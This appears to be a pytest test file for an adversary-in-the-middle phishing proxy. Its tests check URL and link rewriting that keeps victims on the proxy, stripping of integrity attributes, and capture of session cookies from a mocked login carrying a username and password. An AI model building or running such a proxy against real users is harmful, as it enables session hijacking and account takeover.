import pytest
from unittest.mock import AsyncMock, MagicMock, patch, call
from core.proxy.aitm import AiTMProxy
from fastapi import Request, Response

@pytest.fixture
def proxy():
    return AiTMProxy()

def test_rewrite_url_basic(proxy):
    base_url = "https://example.com"
    original = "https://example.com/login"
    # Accessing private method for testing
    rewritten = proxy._rewrite_url(original, base_url)
    assert rewritten == "/login"

def test_rewrite_url_query(proxy):
    base_url = "https://example.com"
    original = "https://example.com/search?q=test"
    rewritten = proxy._rewrite_url(original, base_url)
    assert rewritten == "/search?q=test"

def test_rewrite_url_with_base_path(proxy):
    base_url = "https://example.com"
    original = "https://example.com/login"
    proxy_base = "/v5/p/session123"
    
    rewritten = proxy._rewrite_url(original, base_url, proxy_base)
    assert rewritten == "/v5/p/session123/login"

def test_rewrite_html_links(proxy):
    html = b'<a href="https://example.com/login">Login</a>'
    target_url = "https://example.com"
    
    rewritten = proxy.rewrite_html(html, target_url)
    # The rewrite logic converts absolute links to relative paths to keep them on the proxy
    assert b'href="/login"' in rewritten

def test_rewrite_html_resources(proxy):
    html = b'<img src="https://example.com/logo.png" integrity="sha256-...">'
    target_url = "https://example.com"
    
    rewritten = proxy.rewrite_html(html, target_url)
    assert b'src="/logo.png"' in rewritten
    assert b'integrity' not in rewritten

def test_rewrite_html_meta_refresh(proxy):
    html = b'<meta http-equiv="refresh" content="0; url=https://example.com/dashboard">'
    target_url = "https://example.com"
    
    rewritten = proxy.rewrite_html(html, target_url)
    assert b'content="0; url=/dashboard"' in rewritten

@pytest.mark.asyncio
async def test_proxy_request_cookie_capture():
    # Setup
    proxy = AiTMProxy()
    mock_sm = MagicMock()
    proxy.session_manager = mock_sm
    
    # Mock request
    mock_request = MagicMock(spec=Request)
    mock_request.method = "POST"
    mock_request.headers = {"host": "example.com", "user-agent": "test-bot"}
    mock_request.cookies = {"session": "old-session"}
    
    # Mock aiohttp session and response
    # Create a proper AsyncMock for the context manager
    mock_response = AsyncMock()
    mock_response.read.return_value = b"<html>Success</html>"
    mock_response.status = 302
    
    # Create a MagicMock that behaves like a dict for headers
    headers_dict = {"Location": "https://example.com/dashboard", "Set-Cookie": "session=new-session; Secure"}
    mock_headers = MagicMock()
    
    # Setup __getitem__ (dict access [])
    mock_headers.__getitem__.side_effect = headers_dict.__getitem__
    # Setup __contains__ (in operator)
    mock_headers.__contains__.side_effect = headers_dict.__contains__
    # Setup get()
    mock_headers.get.side_effect = lambda k, d=None: "text/html" if k.lower() == "content-type" else headers_dict.get(k, d)
    # Setup getall()
    mock_headers.getall.return_value = ["session=new-session; Secure"]
    # Setup keys() and items()
    mock_headers.keys.return_value = headers_dict.keys()
    mock_headers.items.return_value = headers_dict.items()
    
    mock_response.headers = mock_headers
    
    # Setup the context manager for session.request()
    mock_context = AsyncMock()
    mock_context.__aenter__.return_value = mock_response
    mock_context.__aexit__.return_value = None
    
    # Setup the session.request method
    mock_client_session = MagicMock()
    mock_client_session.request.return_value = mock_context
    
    # Patch get_session
    with patch.object(proxy, 'get_session', new=AsyncMock(return_value=mock_client_session)):
        
        # Execute
        response = await proxy.proxy_request(
            "https://example.com/login", 
            mock_request, 
            session_id="test-session-123",
            body=b"user=admin&pass=secret",
            proxy_base_path="/v5/p/test-session-123"
        )
        
        # Verify
        assert isinstance(response, Response)
        assert response.status_code == 302
        
        # Verify Location header rewrite
        assert "location" in response.headers or "Location" in response.headers
        loc = response.headers.get("location") or response.headers.get("Location")
        assert loc == "/v5/p/test-session-123/dashboard"
        
        # Verify cookie logging (raw)
        mock_sm.log_raw_cookie.assert_called_with("test-session-123", "session=new-session; Secure")
